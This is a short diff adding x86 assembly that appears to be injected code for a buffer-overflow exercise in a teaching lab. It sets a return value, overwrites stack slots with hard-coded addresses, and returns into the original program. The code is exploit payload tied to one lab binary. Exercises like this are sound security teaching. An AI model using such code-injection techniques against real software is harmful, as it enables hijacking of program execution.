@@ -1,0 +1,5 @@
+movl $0x4c9a567f, %eax
+movl $0x55683f80, 0x55683f50
+movl $0x8048d7c,  0x55683f54
+push $0x8048d7c
+ret
